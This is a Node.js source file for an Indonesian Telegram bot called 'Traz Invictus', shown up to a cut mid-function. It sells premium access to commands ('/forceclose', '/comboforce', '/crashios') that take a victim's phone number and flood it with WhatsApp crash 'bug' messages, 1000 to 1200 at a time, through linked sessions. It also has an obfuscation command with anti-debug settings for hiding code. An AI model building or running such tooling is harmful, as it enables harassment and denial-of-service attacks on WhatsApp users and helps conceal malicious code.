const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// koneksi antar command bug
const { FChyUi, ComBoxFC, CrashIos } = require("./function/func.js");

// koneksi antar command whatsapp sesi
const {
  connectToWhatsApp,
  initializeWhatsAppConnections,
  sessions,
  saveActiveSessions
} = require("./function/waSession");

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/NPConTop/BOTALL/refs/heads/main/databasebot.json";
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Please Wait... Checking Tokens 😁"));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("🚫 𝚃𝙾𝙺𝙴𝙽 𝙱𝙴𝙻𝚄𝙼 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁...."));
    process.exit(1);
  }

  console.log(chalk.green(` 𝚃𝙾𝙺𝙴𝙽 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁...⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(
    chalk.red(`
█ 15%
██ 30%
█████ 75%
██████ 100%
⋘ 𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡 – 𝑙𝑜𝑎𝑑𝑖𝑛𝑔 𝑑𝑎𝑡𝑎… ⋙ 
`)
  );

  console.log(
    chalk.red(`
[ 𝐓𝐎𝐊𝐄𝐍 𝐓𝐄𝐑𝐃𝐀𝐅𝐓𝐀𝐑 ® ]
`)
  );

  console.log(
    chalk.blue(`
>> [ BOT IS RUNNING ] <<
`)
  );
}

validateToken();

let sock;

//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/1zbnyf.jpg",
    "https://files.catbox.moe/2klaqv.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// ~ Enc Xopwn Confugurasi
const getVincentObfuscationConfig = () => {
  const generateSiuCalcrickName = () => {
    // Identifier generator pseudo-random tanpa crypto
    const chars =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let randomPart = "";
    for (let i = 0; i < 6; i++) {
      // 6 karakter untuk keseimbangan
      randomPart += chars[Math.floor(Math.random() * chars.length)];
    }
    return `//MAKLUENC 和无气${randomPart}`;
  };

  return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    shuffle: true,
    rgf: false,
    flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
      selfDefending: true,
      antiDebug: true,
      integrity: true,
      tamperProtection: true,
    },
  };
};

// #Progres #1
const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
  if (!bot || !chatId || !message || !message.message_id) {
    console.error("updateProgress: Bot, chatId, atau message tidak valid");
    return;
  }

  const bar = createProgressBar(percentage);
  const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;

  try {
    await bot.editMessageText(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ${levelText} (${percentage}%)\n` +
        ` ${bar}\n` +
        "```\n" +
        "Kipop Encrypt Hard",
      {
        chat_id: chatId,
        message_id: message.message_id,
        parse_mode: "Markdown",
      }
    );
    await new Promise((resolve) =>
      setTimeout(resolve, Math.min(800, percentage * 8))
    );
  } catch (error) {
    console.error("Gagal memperbarui progres:", error.message);
  }
}

// [ BUG FUNCTION ]

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`
┏━ᖫ 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ᖭ
┃Bot Name : Traz Invictus
┃Version : 2.5
┃RunTime : ${runtime}
┗━━━━━━━━━━━━━━━━━━━━
┏
┃☐ User Id : ${senderId}
┃☐ Username : ${username}
┃☐ Status : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━
╭── ────────── ────╮
│[ sᴇʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ]
╰── ────────── ────╯
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "信息", url: "https://t.me/traz_Invictus" }],
        [
          { text: "错误菜单🦠", callback_data: "bug_menu" },
          { text: "所有者菜单👑", callback_data: "owner_menu" },
        ],
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_menu") {
      caption = `\`\`\`
┏━ᖫ 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ᖭ
┃Bot Name : Traz Invictus
┃Version : 2.5
┃RunTime : ${runtime}
┗━━━━━━━━━━━━━━━━━━━━
┏
┃☐ User Id : ${senderId}
┃☐ Username : ${username}
┃☐ Status : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━  

┏━━『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』
┃╭─────────────────
╿│☐ ⧽ /ғᴏʀᴄᴇᴄʟᴏsᴇ × ɴᴏ
╿│☐ ⧽ /ᴄᴏᴍʙᴏғᴏʀᴄᴇ × ɴᴏ
╿│☐ ⧽ /ᴄʀᴀsʜɪᴏs × ɴᴏ
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "[ 𝙱𝙰𝙲𝙺 ]", callback_data: "back" }]],
      };
    }

    if (query.data === "owner_menu") {
      caption = `\`\`\`
┏━ᖫ 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ᖭ
┃Bot Name : Traz Invictus
┃Version : 2.5
┃RunTime : ${runtime}
┗━━━━━━━━━━━━━━━━━━━━
┏
┃☐ User Id : ${senderId}
┃☐ Username : ${username}
┃☐ Status : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━

┏━━『 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 』
┃╭─────────────────
╿│☐ ⧽ /ᴀᴅᴅᴀᴅᴍɪɴ × ɪᴅ
╿│☐ ⧽ /ᴅᴇʟᴀᴅᴍɪɴ × ɪᴅ
╿│☐ ⧽ /sᴇᴛᴄᴅ × ᴛɪᴍᴇ
╿│☐ ⧽ /ᴄᴏɴɴᴇᴄᴛ × ɴᴏ
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━『 𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨 』
┃╭─────────────────
╿│☐ ⧽ /ᴀᴅᴅᴘʀᴇᴍ × ɪᴅ
╿│☐ ⧽ /ᴅᴇʟᴘʀᴇᴍ × ɪᴅ
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "[ 𝙱𝙰𝙲𝙺 ]", callback_data: "back" }]],
      };
    }

    if (query.data === "back") {
      caption = `\`\`\`
┏━ᖫ 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ᖭ
┃Bot Name : Traz Invictus
┃Version : 2.5
┃RunTime : ${runtime}
┗━━━━━━━━━━━━━━━━━━━━
┏
┃☐ User Id : ${senderId}
┃☐ Username : ${username}
┃☐ Status : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━
╭── ────────── ────╮
│[ sᴇʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ]
╰── ────────── ────╯
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "信息", url: "https://t.me/traz_Invictus" }],
          [
            { text: "错误菜单🦠", callback_data: "bug_menu" },
            { text: "所有者菜单👑", callback_data: "owner_menu" },
          ],
        ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
//=======CASE BUG=========//

bot.onText(/\/forceclose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/kipopLecy" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/qwvr0l.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 1000; i++) {
      await FChyUi(sock, jid);
      await FChyUi(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/comboforce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/kipopLecy" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/qwvr0l.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 1200; i++) {
      await ComBoxFC(sock, jid);
      await FChyUi(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/crashios (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/kipopLecy" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/qwvr0l.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 1000; i++) {
      await CrashIos(sock, jid);
      await CrashIos(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Enc Fiture

bot.onText(/\/encrypt/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id.toString();

  // Cek apakah balas pesan dengan file
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(
      chatId,
      "❌ *Error:* Balas file .js dengan `/encvincent`!",
      { parse_mode: "Markdown" }
    );
  }

  const file = msg.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return bot.sendMessage(
      chatId,
      "❌ *Error:* Hanya file .js yang didukung!",
      { parse_mode: "Markdown" }
    );
  }

  const encryptedPath = path.join(__dirname, `Traz-Encrypt-${file.file_name}`);

  try {
    const progressMessage = await bot.sendMessage(
      chatId,
      "🔃 Memulai proses enkripsi..."
    );

    await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

    // **Perbaikan pengambilan file dari Telegram**
    const fileData = await bot.getFile(file.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    let fileContent = response.data.toString("utf-8");

    await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

    // Cek apakah file valid sebelum dienkripsi
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
    }

    await updateProgress(
      bot,
      chatId,
      progressMessage,
      40,
      "Inisialisasi Enkripsi"
    );

    // Proses enkripsi menggunakan Vincent Chaos Core
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getVincentObfuscationConfig()
    );
    let obfuscatedCode = obfuscated.code || obfuscated;

    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    // Cek apakah hasil enkripsi valid
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(
      bot,
      chatId,
      progressMessage,
      80,
      "Finalisasi Enkripsi"
    );

    await fs.promises.writeFile(encryptedPath, obfuscatedCode);

    // Kirim file hasil enkripsi
    await bot.sendDocument(chatId, encryptedPath, {
      caption: "✅ Sukes Ecnrypt By @kipopLecy",
      parse_mode: "Markdown",
    });

    await updateProgress(
      bot,
      chatId,
      progressMessage,
      100,
      "Vincent Chaos Core Selesai"
    );

    // Hapus file setelah dikirim
    try {
      await fs.promises.access(encryptedPath);
      await fs.promises.unlink(encryptedPath);
    } catch (err) {
      console.error("Gagal menghapus file:", err.message);
    }
  } catch (error) {
